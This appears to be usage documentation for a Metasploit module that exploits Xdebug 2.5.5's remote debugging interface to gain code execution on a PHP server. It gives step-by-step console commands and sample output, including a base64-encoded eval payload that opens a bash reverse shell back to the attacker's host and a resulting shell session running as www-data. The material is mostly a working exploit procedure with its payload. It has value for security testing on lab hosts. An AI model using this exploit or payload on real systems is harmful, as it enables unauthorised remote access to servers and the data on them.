Xdebug is a PHP debugging tool that supports remote debugging of PHP code on the server via source code.
This module exploits the RCE vulnerability and gives a command shell back.

- Source: https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface

- Documentation: https://xdebug.org/docs-dbgp.php

- Tested on: Xdebug version 2.5.5

List the steps needed to make sure this thing works

-  Start `msfconsole`
-  `use exploits/unix/http/xdebug_rce`
-  `check`
-  `set RHOST 10.10.10.10
-   `set LHOST 10.10.14.197`
-   `exploit`

**Example Outputs**

- Check

```msf > use exploits/unix/http/xdebug_rce
msf exploit(unix/http/xdebug_rce) > set RHOST 10.10.10.10
RHOST => 10.10.10.10
msf exploit(unix/http/xdebug_rce) > set LHOST tun0
LHOST => tun0
msf exploit(unix/http/xdebug_rce) > check

[+] 10.10.10.10:80 - Looks like remote server has xdebug enabled

[*] 10.10.10.10:80 The target service is running, but could not be validated.
msf exploit(unix/http/xdebug_rce) > ```



- Run


msf exploit(unix/http/xdebug_rce) > run

[*] Started reverse TCP handler on 10.10.14.197:4444 
[+] 10.10.10.10:80 - Looks like remote server has xdebug enabled

[*] 10.10.10.83:80 - Sending payload...... 
[*] 10.10.10.10:80 - Waiting for client response.....
[*] 10.10.10.10:80 - Received data.....
[*] Command shell session 1 opened (10.10.14.197:4444 -> 10.10.10.10:36628) at 2018-04-23 20:45:41 +0530

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

- Run verbose output

msf exploit(unix/http/xdebug_rce) > set verbose true
verbose => true
msf exploit(unix/http/xdebug_rce) > run

[*] Started reverse TCP handler on 10.10.14.197:4444 
Request send
Date: Mon, 23 Apr 2018 15:16:56 GMT
Server: Apache
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
Xdebug: 2.5.5
Content-Length: 314
Content-Type: text/html; charset=UTF-8


[+] 10.10.10.10:80 - Looks like remote server has xdebug enabled

[*] 10.10.10.10:80 - Sending payload...... 
Payload sent-eval -i 1 -- c3lzdGVtKCIgYmFzaCAtYyAnMDwmMTkyLTtleGVjIDE5Mjw+L2Rldi90Y3AvMTAuMTAuMTQuMTk3LzQ0NDQ7c2ggPCYxOTIgPiYxOTIgMj4mMTkyJyIp
[*] 10.10.10.10:80 - Waiting for client response.....
[*] 10.10.10.10:80 - Received data.....
490<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/index.php" language="PHP" xdebug:language_version="7.1.12" protocol_version="1.0" appid="1179" idekey="jtGjvfApYD"><engine version="2.5.5"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]></copyright></init>
[*] Command shell session 2 opened (10.10.14.197:4444 -> 10.10.10.10:36676) at 2018-04-23 20:46:56 +0530

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)```
